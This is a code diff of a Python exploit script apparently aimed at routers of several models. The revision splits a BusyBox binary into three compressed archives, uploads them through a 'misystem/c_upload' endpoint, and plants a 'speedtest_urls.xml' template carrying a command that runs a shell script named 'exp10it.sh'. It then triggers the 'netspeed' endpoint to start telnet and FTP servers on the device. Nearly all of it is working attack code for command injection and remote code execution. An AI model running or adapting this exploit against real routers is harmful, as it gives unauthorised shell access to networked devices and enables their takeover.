@@ -68,55 +68,75 @@ try:
 except Exception:
   die("Password is not correct!")
 
+dn_tmp = 'tmp/'
+dn_dir = 'data/payload/'
+
 print("Begin creating a payload for the exploit...")
-fn_dir      = 'data/payload/'
-fn_tmp      = 'tmp/'
 fn_payload1 = 'tmp/payload1.tar.gz'
 fn_payload2 = 'tmp/payload2.tar.gz'
-fn_bb1 = fn_tmp + 'busybox_01'
-fn_bb2 = fn_tmp + 'busybox_02'
+fn_payload3 = 'tmp/payload3.tar.gz'
+fn_pfname = 'busybox'
 
-fn_bb = 'busybox_mips'
+fn_pf1 = dn_tmp + fn_pfname + '_01'
+fn_pf2 = dn_tmp + fn_pfname + '_02'
+fn_pf3 = dn_tmp + fn_pfname + '_03'
+
+fn_suffix = '_mips'
 if dname == 'r3d':
-  fn_bb = 'busybox_armv7a'
+  fn_suffix = '_armv7a'
 if dname == "rb03":
-  fn_bb = 'busybox_arm64'
+  fn_suffix = '_arm64'
+
+fn_pf = dn_dir + fn_pfname + fn_suffix
 
 if os.path.exists(fn_payload1):
   os.remove(fn_payload1)
 if os.path.exists(fn_payload2):
   os.remove(fn_payload2)
+if os.path.exists(fn_payload3):
+  os.remove(fn_payload3)
 
-with open(fn_dir + fn_bb, "rb") as file:
-  bb = file.read()
-fpos = len(bb) // 2
-with open(fn_bb1, "wb") as file:
-  file.write(bb[:fpos])
-with open(fn_bb2, "wb") as file:
-  file.write(bb[fpos:])
+with open(fn_pf, "rb") as file:
+  pf = file.read()
+psize = len(pf) // 3
+wsize = psize + 8000
+with open(fn_pf1, "wb") as file:
+  file.write(pf[:wsize])
+pf = pf[wsize:]
+wsize = psize - 8000
+with open(fn_pf2, "wb") as file:
+  file.write(pf[:wsize])
+pf = pf[wsize:]
+with open(fn_pf3, "wb") as file:
+  file.write(pf)
 
 fn_exploit = "exp10it.sh"
 command = "sh /tmp/" + fn_exploit
 
 fn_executor = "speedtest_urls.xml"
-with open(fn_dir + fn_executor, "rt", encoding = "UTF-8") as file:
+with open(dn_dir + fn_executor, "rt", encoding = "UTF-8") as file:
   template = file.read()
 data = template.format(router_ip_address=ip_addr, command=command)
-with open(fn_tmp + fn_executor, "wt", encoding = "UTF-8", newline = "\n") as file:
+with open(dn_tmp + fn_executor, "wt", encoding = "UTF-8", newline = "\n") as file:
   file.write(data)
 
 with tarfile.open(fn_payload1, "w:gz", compresslevel=9) as tar:
-  tar.add(fn_bb1, arcname = os.path.basename(fn_bb1))
+  tar.add(fn_pf1, arcname = os.path.basename(fn_pf1))
 
 with tarfile.open(fn_payload2, "w:gz", compresslevel=9) as tar:
-  tar.add(fn_bb2, arcname = os.path.basename(fn_bb2))
-  tar.add(fn_dir + fn_exploit, arcname = fn_exploit)
-  tar.add(fn_tmp + fn_executor, arcname = fn_executor)
+  tar.add(fn_pf2, arcname = os.path.basename(fn_pf2))
 
-if os.path.exists(fn_bb1):
-  os.remove(fn_bb1)
-if os.path.exists(fn_bb2):
-  os.remove(fn_bb2)
+with tarfile.open(fn_payload3, "w:gz", compresslevel=9) as tar:
+  tar.add(fn_pf3, arcname = os.path.basename(fn_pf3))
+  tar.add(dn_dir + fn_exploit, arcname = fn_exploit)
+  tar.add(dn_tmp + fn_executor, arcname = fn_executor)
+
+if os.path.exists(fn_pf1):
+  os.remove(fn_pf1)
+if os.path.exists(fn_pf2):
+  os.remove(fn_pf2)
+if os.path.exists(fn_pf3):
+  os.remove(fn_pf3)
 
 tgz_size1 = os.path.getsize(fn_payload1)
 if tgz_size1 > 100*1024 - 128:
@@ -133,8 +153,11 @@ if (fn_payload1):
   requests.post(urlapi + "misystem/c_upload", files={"image":open(fn_payload1, 'rb')})
 if (fn_payload2):
   requests.post(urlapi + "misystem/c_upload", files={"image":open(fn_payload2, 'rb')})
+if (fn_payload3):
+  requests.post(urlapi + "misystem/c_upload", files={"image":open(fn_payload3, 'rb')})
 
 print("Running TELNET and FTP servers...")
+
 requests.get(urlapi + "xqnetdetect/netspeed")
 
 time.sleep(0.5)
